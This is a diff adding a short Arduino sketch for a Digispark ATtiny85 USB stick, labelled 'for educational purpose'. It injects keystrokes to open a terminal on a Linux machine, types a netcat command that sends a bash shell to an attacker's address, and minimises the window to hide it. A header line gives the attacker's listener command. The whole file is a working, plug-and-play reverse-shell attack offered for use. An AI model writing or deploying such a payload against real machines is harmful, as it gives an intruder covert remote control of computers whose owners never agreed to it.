@@ -1,0 +1,32 @@
+ONLY FOR EDUCATIONAL PURPOSE. Script for getting reverse shell in kali Linux/ Linux using Digi spark ATtiny85 USB
+
+THROUGH THIS SCRIPT YOU CAN TAKE A REVERSE SHELL OF ANY LINUX MACHINE ON YOUR KALI LINUX. JUST PLUG AND PLAY.
+
+nc -lnvp 80 192.168.0.0    //TYPE THIS COMMAND IN THE ATTACKER MACHINE TO GET THE REVERSE SHELL
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+//Script for getting reverse shell in kali linux using digispark:- 
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+}
+
+
+void loop() {
+  // prevent missing the first character after a delay:
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);     //OPEN TERMINAL
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("nc -e /bin/bash 192.168.0.0 80");   //ENTER THE IP ADDRESS OF ATTACKER MACHINE AND YOU CAN USE ANY PORT
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_CONTROL_LEFT | MOD_ALT_LEFT);    //MINIMIZE THE TERMINAL 
+
+  for(;;){
+    
+  }
+}
